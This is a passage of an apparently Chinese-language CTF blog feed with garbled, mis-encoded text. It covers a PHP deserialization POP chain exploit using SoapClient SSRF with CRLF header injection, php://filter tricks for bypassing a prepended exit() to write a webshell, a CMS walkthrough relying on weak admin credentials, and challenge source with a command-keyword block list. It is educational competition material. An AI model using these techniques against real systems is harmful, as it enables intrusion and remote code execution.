class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> SoapClient<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__call</span> <span class="token punctuation">(</span> string <span class="token variable">$function_name</span> <span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$arguments</span> <span class="token punctuation">)</span></code></pre><ul><li><code>unserialize(HelloWorld_DB)-&gt;__wakeup()-&gt;Typecho_Db</code>ï¼Œ<code>$this-&gt;coincidence['hello']</code> ä½œä¸º <code>Typecho_Db</code> çš„<code>__construct()</code> æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°</li><li><code>throw new Typecho_Db_Exception("Adapter {$adapterName} is not available"</code>å§ç±»å½“åšå­—ç¬¦ä¸²è§¦å‘<code>__toString()</code>é­”æœ¯æ–¹æ³•</li><li><code>__toString()-&gt;_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)</code></li><li><code>$this-&gt;_adapter = new $adapterName()</code>è§¦å‘äº† <code>SoapClient</code> çš„<code>__call()</code> é­”æœ¯æ–¹æ³•</li></ul><p><strong>exp</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Typecho_Db_Query</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$_sqlPreBuild</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$_adapter</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>       <span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php';</span>        <span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string">'X-Forwarded-For: 127.0.0.1'</span><span class="token punctuation">,</span>        <span class="token string">'Cookie: PHPSESSID=a8vkg6l5j5sesvqan5q5s4obr1'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'H3ng^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'uri'</span>      <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_sqlPreBuild</span> <span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"SELECT"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_adapter</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HelloWorld_DB</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$coincidence</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">coincidence</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"hello"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Db_Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloWorld_DB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æƒ³è¦å¸¦ SESSION å‡ºæ¥ï¼Œå¿…é¡»è¦æŠŠè‡ªå·±çš„ PHPSESSID ä¼ è¿‡åŽ»ï¼Œç„¶è€Œ SOAP å¹¶ä¸èƒ½è®¾ç½® Cookieï¼Œå› æ­¤éœ€è¦ CRLFã€‚SoapClient å¯ä»¥è®¾ç½® UAï¼Œåªè¦åœ¨ UA åŽåŠ ä¸Š <code>\r\nCookie: PHPSESSID=xxx</code> å°±èƒ½ä¸º http å¤´æ·»åŠ ä¸€ä¸ªæ–°çš„ Cookie å­—æ®µï¼Œè¿™æ ·å°±èƒ½å¸¦ä¸Š session äº†ã€‚</p><p><img src="/2021/10/04/mrctf2020-ezpop-revenge/image-20211005200834623.png" alt="image-20211005200834623"></p><p><img src="/2021/10/04/mrctf2020-ezpop-revenge/image-20211005200750405.png" alt="image-20211005200750405"></p><ul><li>PHPåºåˆ—åŒ–çš„æ—¶å€™privateå’Œprotectedå˜é‡ä¼šå¼•å…¥ä¸å¯è§å­—ç¬¦\x00ï¼Œè¾“å‡ºå’Œå¤åˆ¶çš„æ—¶å€™å¯èƒ½ä¼šé—å¤±è¿™äº›ä¿¡æ¯ï¼Œå¯¼è‡´ååºåˆ—åŒ–çš„æ—¶å€™å‡ºé”™ã€‚</li><li>privateå±žæ€§åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼•å…¥ä¸¤ä¸ª\x00ï¼Œæ³¨æ„è¿™ä¸¤ä¸ª\x00å°±æ˜¯asciiç ä¸º0çš„å­—ç¬¦ã€‚è¿™ä¸ªå­—ç¬¦æ˜¾ç¤ºå’Œè¾“å‡ºå¯èƒ½çœ‹ä¸åˆ°ï¼Œç”šè‡³å¯¼è‡´æˆªæ–­ï¼Œå¦‚å›¾1ï¼Œurlç¼–ç åŽå°±å¯ä»¥çœ‹å¾—å¾ˆæ¸…æ¥šäº†ã€‚</li><li>åŒç†ï¼Œprotectedå±žæ€§ä¼šå¼•å…¥<code>\x00*\x00</code>ã€‚</li><li>æ­¤æ—¶ï¼Œä¸ºäº†æ›´åŠ æ–¹ä¾¿è¿›è¡Œååºåˆ—åŒ–Payloadçš„ä¼ è¾“ä¸Žæ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åŽé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤ºã€‚æ¯”å¦‚<code>s:5:â€A&lt;null_byte&gt;Bâ€œ;Ì€ -&gt; S:5:â€A\00B\09\0Dâ€;</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php://filterç»•è¿‡exit()</title>
      <link href="2021/10/02/php-filter-rao-guo-exit/"/>
      <url>2021/10/02/php-filter-rao-guo-exit/</url>
      
        <content type="html"><![CDATA[<p>åŽŸæ–‡ï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p><p>php://filteræ˜¯PHPä¸­ç‹¬æœ‰çš„åè®®ï¼Œåˆ©ç”¨è¿™ä¸ªåè®®å¯ä»¥åˆ›é€ å¾ˆå¤šâ€œå¦™ç”¨â€ï¼Œæœ¬æ–‡è¯´å‡ ä¸ªæœ‰æ„æ€çš„ç‚¹ï¼Œå‰©ä¸‹çš„å¤§å®¶è‡ªå·±ä¸‹åŽ»ä½“ä¼šã€‚æœ¬æ¥æœ¬æ–‡çš„æ€è·¯æˆ‘ä¸ŠåŠå¹´å°±å‡†å¤‡æ‹¿æ¥åšXDCTF2016çš„é¢˜ç›®çš„ï¼Œæ²¡æƒ³åˆ°è¢«ä¸‰ä¸ªç™½å¸½çš„ä¸€é¢˜æŠ¢å…ˆç”¨äº†ï¼Œæˆ‘ä¹Ÿå°±åªå¥½æå‰åˆ†äº«ä¸€ä¸‹ã€‚</p><h2 id="XXEä¸­çš„ä½¿ç”¨"><a href="#XXEä¸­çš„ä½¿ç”¨" class="headerlink" title="XXEä¸­çš„ä½¿ç”¨"></a>XXEä¸­çš„ä½¿ç”¨</h2><p>php://filterä¹‹å‰æœ€å¸¸å‡ºé•œçš„åœ°æ–¹æ˜¯XXEã€‚ç”±äºŽXXEæ¼æ´žçš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬åœ¨è¯»å–HTMLã€PHPç­‰æ–‡ä»¶æ—¶å¯èƒ½ä¼šæŠ›å‡ºæ­¤ç±»é”™è¯¯<code>parser error : StartTag: invalid element name</code> ã€‚å…¶åŽŸå› æ˜¯ï¼ŒPHPæ˜¯åŸºäºŽæ ‡ç­¾çš„è„šæœ¬è¯­è¨€ï¼Œ<code>&lt;?php ... ?&gt;</code>è¿™ä¸ªè¯­æ³•ä¹Ÿä¸ŽXMLç›¸ç¬¦åˆï¼Œæ‰€ä»¥åœ¨è§£æžXMLçš„æ—¶å€™ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯XMLï¼Œè€Œå…¶ä¸­å†…å®¹ï¼ˆæ¯”å¦‚ç‰¹æ®Šå­—ç¬¦ï¼‰åˆæœ‰å¯èƒ½å’Œæ ‡å‡†XMLå†²çªï¼Œæ‰€ä»¥å¯¼è‡´äº†å‡ºé”™ã€‚</p><p>é‚£ä¹ˆï¼Œä¸ºäº†è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„PHPç­‰æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±è¦å…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„PHPä»£ç â€ç¼–ç ä¸€éï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°php://filterã€‚</p><p>php://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµï¼Œä½œç”¨æ˜¯ä½œä¸ºä¸€ä¸ªâ€œä¸­é—´æµâ€æ¥å¤„ç†å…¶ä»–æµã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹ä¸€è¡Œä»£ç å°†POSTå†…å®¹è½¬æ¢æˆbase64ç¼–ç å¹¶è¾“å‡ºï¼š</p><pre><code>readfile("php://filter/read=convert.base64-encode/resource=php://input");</code></pre><p>å¦‚ä¸‹ï¼š</p><p><a href="https://www.leavesongs.com/content/uploadfile/201607/0f851469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-0f851469385893.png" alt="QQæˆªå›¾20160724234603.png"></a></p><p>æ‰€ä»¥ï¼Œåœ¨XXEä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†PHPç­‰å®¹æ˜“å¼•å‘å†²çªçš„æ–‡ä»¶æµç”¨php://filteråè®®æµå¤„ç†ä¸€éï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆè§„é¿ç‰¹æ®Šå­—ç¬¦é€ æˆæ··ä¹±ã€‚</p><p>å¦‚ä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code></p><p><a href="https://www.leavesongs.com/content/uploadfile/201607/693b1469385893.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-693b1469385893.png" alt="QQæˆªå›¾20160724235335.png"></a></p><h2 id="å·§ç”¨ç¼–ç ä¸Žè§£ç "><a href="#å·§ç”¨ç¼–ç ä¸Žè§£ç " class="headerlink" title="å·§ç”¨ç¼–ç ä¸Žè§£ç "></a>å·§ç”¨ç¼–ç ä¸Žè§£ç </h2><p>ä½¿ç”¨ç¼–ç ä¸å…‰å¯ä»¥å¸®åŠ©æˆ‘ä»¬èŽ·å–æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å¸®æˆ‘ä»¬åŽ»é™¤ä¸€äº›â€œä¸å¿…è¦çš„éº»çƒ¦â€ã€‚</p><p>è®°å¾—å‰æ®µæ—¶é—´ä¸‰ä¸ªç™½å¸½æœ‰ä¸ªæ¯”èµ›ï¼Œå…¶ä¸­æœ‰ä¸€éƒ¨åˆ†ä»£ç å¤§æ¦‚ç±»ä¼¼äºŽä»¥ä¸‹ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;?php exit; ?>'</span><span class="token punctuation">;</span><span class="token variable">$content</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>$content</code>åœ¨å¼€å¤´å¢žåŠ äº†exitè¿‡ç¨‹ï¼Œå¯¼è‡´å³ä½¿æˆ‘ä»¬æˆåŠŸå†™å…¥ä¸€å¥è¯ï¼Œä¹Ÿæ‰§è¡Œä¸äº†ï¼ˆè¿™ä¸ªè¿‡ç¨‹åœ¨å®žæˆ˜ä¸­ååˆ†å¸¸è§ï¼Œé€šå¸¸å‡ºçŽ°åœ¨ç¼“å­˜ã€é…ç½®æ–‡ä»¶ç­‰ç­‰åœ°æ–¹ï¼Œä¸å…è®¸ç”¨æˆ·ç›´æŽ¥è®¿é—®çš„æ–‡ä»¶ï¼Œéƒ½ä¼šè¢«åŠ ä¸Šif(!defined(xxx))exit;ä¹‹ç±»çš„é™åˆ¶ï¼‰ã€‚é‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚ä½•ç»•è¿‡è¿™ä¸ªâ€œæ­»äº¡exitâ€ï¼Ÿ</p><p>å¹¸è¿çš„æ˜¯ï¼Œè¿™é‡Œçš„<code>$_POST['filename']</code>æ˜¯å¯ä»¥æŽ§åˆ¶åè®®çš„ï¼Œæˆ‘ä»¬å³å¯ä½¿ç”¨ php://filteråè®®æ¥æ–½å±•é­”æ³•ï¼šä½¿ç”¨php://filteræµçš„base64-decodeæ–¹æ³•ï¼Œå°†<code>$content</code>è§£ç ï¼Œåˆ©ç”¨php base64_decodeå‡½æ•°ç‰¹æ€§åŽ»é™¤â€œæ­»äº¡exitâ€ã€‚</p><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œbase64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p><p>æ‰€ä»¥ï¼Œä¸€ä¸ªæ­£å¸¸çš„base64_decodeå®žé™…ä¸Šå¯ä»¥ç†è§£ä¸ºå¦‚ä¸‹ä¸¤ä¸ªæ­¥éª¤ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'|[^a-z0-9A-Z+/]|s'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ‰€ä»¥ï¼Œå½“<code>$content</code>è¢«åŠ ä¸Šäº†<code>&lt;?php exit; ?&gt;</code>ä»¥åŽï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ php://filter/write=convert.base64-decode  æ¥é¦–å…ˆå¯¹å…¶è§£ç ã€‚åœ¨è§£ç çš„è¿‡ç¨‹ä¸­ï¼Œå­—ç¬¦&lt;ã€?ã€;ã€&gt;ã€ç©ºæ ¼ç­‰ä¸€å…±æœ‰7ä¸ªå­—ç¬¦ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥ï¼Œæ‰€ä»¥æœ€ç»ˆè¢«è§£ç çš„å­—ç¬¦ä»…æœ‰â€œphpexitâ€å’Œæˆ‘ä»¬ä¼ å…¥çš„å…¶ä»–å­—ç¬¦ã€‚</p><p>â€œphpexitâ€ä¸€å…±7ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢žåŠ 1ä¸ªâ€œaâ€ä¸€å…±8ä¸ªå­—ç¬¦ã€‚è¿™æ ·ï¼Œâ€phpexitaâ€è¢«æ­£å¸¸è§£ç ï¼Œè€ŒåŽé¢æˆ‘ä»¬ä¼ å…¥çš„webshellçš„base64å†…å®¹ä¹Ÿè¢«æ­£å¸¸è§£ç ã€‚ç»“æžœå°±æ˜¯<code>&lt;?php exit; ?&gt;</code>æ²¡æœ‰äº†ã€‚</p><p>æœ€åŽæ•ˆæžœæ˜¯ ï¼š</p><p><a href="https://www.leavesongs.com/content/uploadfile/201607/fca81469385894.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-fca81469385894.png" alt="QQæˆªå›¾20160725005316.png"></a></p><h2 id="åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•"><a href="#åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•" class="headerlink" title="åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•"></a><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_2">åˆ©ç”¨å­—ç¬¦ä¸²æ“ä½œæ–¹æ³•</a></h2><p>æœ‰çš„åŒå­¦è¯´ï¼Œbase64çš„ç®—æ³•æˆ‘ä¸æ‡‚ï¼Œä¸Šé¢çš„æ–¹æ³•å¤ªå¤æ‚äº†ã€‚</p><p>å…¶å®žï¼Œé™¤äº†ä½¿ç”¨base64ç‰¹æ€§çš„æ–¹æ³•å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨php://filterå­—ç¬¦ä¸²å¤„ç†æ–¹æ³•æ¥åŽ»é™¤â€œæ­»äº¡exitâ€ã€‚æˆ‘ä»¬è§‚å¯Ÿä¸€ä¸‹ï¼Œè¿™ä¸ª<code>&lt;?php exit; ?&gt;</code>å®žé™…ä¸Šæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>å®žé™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ ‡ç­¾ï¼Œæ—¢ç„¶æ˜¯XMLæ ‡ç­¾ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨strip_tagså‡½æ•°åŽ»é™¤å®ƒï¼Œè€Œphp://filteråˆšå¥½æ˜¯æ”¯æŒè¿™ä¸ªæ–¹æ³•çš„ã€‚</p><p>ç¼–å†™å¦‚ä¸‹æµ‹è¯•ä»£ç å³å¯æŸ¥çœ‹ php://filter/read=string.strip_tags/resource=php://input çš„æ•ˆæžœï¼š</p><pre><code>echo readfile('php://filter/read=string.strip_tags/resource=php://input');</code></pre><p><a href="https://www.leavesongs.com/content/uploadfile/201607/499a1469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-499a1469385895.png" alt="QQæˆªå›¾20160725010403.png"></a></p><p>å¯è§ï¼Œ<code>&lt;?php exit; ?&gt;</code>è¢«åŽ»é™¤äº†ã€‚ä½†å›žåˆ°ä¸Šé¢çš„é¢˜ç›®ï¼Œæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯å†™å…¥ä¸€ä¸ªwebshellï¼Œè€Œå†™å…¥çš„webshellä¹Ÿæ˜¯phpä»£ç ï¼Œå¦‚æžœä½¿ç”¨strip_tagsåŒæ ·ä¼šè¢«åŽ»é™¤ã€‚</p><p>ä¸‡å¹¸çš„æ˜¯ï¼Œphp://filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†webshellç”¨base64ç¼–ç ã€‚åœ¨è°ƒç”¨å®Œæˆstrip_tagsåŽå†è¿›è¡Œbase64-decodeã€‚â€œæ­»äº¡exitâ€åœ¨ç¬¬ä¸€æ­¥è¢«åŽ»é™¤ï¼Œè€Œwebshellåœ¨ç¬¬äºŒæ­¥è¢«è¿˜åŽŸã€‚</p><p>æœ€ç»ˆçš„æ•°æ®åŒ…å¦‚ä¸‹ï¼š</p><p><a href="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQæˆªå›¾20160725011007.png"></a></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨rot13ç¼–ç ç‹¬ç«‹å®Œæˆä»»åŠ¡ã€‚åŽŸç†å’Œä¸Šé¢ç±»ä¼¼ï¼Œæ ¸å¿ƒæ˜¯å°†â€œæ­»äº¡exitâ€åŽ»é™¤ã€‚<code>&lt;?php exit; ?&gt;</code>åœ¨ç»è¿‡rot13ç¼–ç åŽä¼šå˜æˆ<code>&lt;?cuc rkvg; ?&gt;</code>ï¼Œåœ¨PHPä¸å¼€å¯short_open_tagæ—¶ï¼Œphpä¸è®¤è¯†è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šæ‰§è¡Œäº†ï¼š</p><p><a href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQæˆªå›¾20160725012639.png"></a></p><p>å½“ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶å°±æ˜¯ä¸å¼€å¯çŸ­æ ‡ç­¾ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTFï¼š2021-è‰çŸ¥cms</title>
      <link href="2021/10/01/gkctf-2021-chan-zhi-cms/"/>
      <url>2021/10/01/gkctf-2021-chan-zhi-cms/</url>
      
        <content type="html"><![CDATA[<p>æç¤ºåŽå°å¼±å£ä»¤</p><pre><code>admin 12345</code></pre><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162552187.png" alt="image-20211001162552187"></p><p>ç™¾åº¦æœç´¢è‰çŸ¥7.7+æ¼æ´žå‘çŽ°å‘½ä»¤æ‰§è¡Œ,ç›´æŽ¥æ‰“</p><p>ç™»å½•åŽå°ï¼š</p><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162715047.png" alt="image-20211001162715047"></p><p>è¯·åœ¨æœåŠ¡å™¨åˆ›å»º /var/www/html/system/tmp/erjn.txt æ–‡ä»¶</p><p>è®¾ç½®-&gt;å¾®ä¿¡è®¾ç½®</p><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162812048.png" alt="image-20211001162812048"></p><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001162856369.png" alt="image-20211001162856369"></p><p>è¿™é‡Œå°±å¯ä»¥æˆåŠŸä¿å­˜</p><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001163635564.png" alt="image-20211001163635564"></p><pre><code>http://9eed68a6-b18e-4dcc-a17b-cf404855fb80.node4.buuoj.cn:81/www/</code></pre><p><img src="/2021/10/01/gkctf-2021-chan-zhi-cms/image-20211001163740176.png" alt="image-20211001163740176"></p>]]></content>
      
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTFï¼š2020-EzPHP</title>
      <link href="2021/09/28/bjdctf-2020-ezphp/"/>
      <url>2021/09/28/bjdctf-2020-ezphp/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/28/bjdctf-2020-ezphp/image-20210816183237244.png" alt="image-20210816183237244"></p><p>F12</p><p><img src="/2021/09/28/bjdctf-2020-ezphp/image-20210816183257665.png" alt="image-20210816183257665"></p><p>base32è§£ç 1nD3x.php</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span 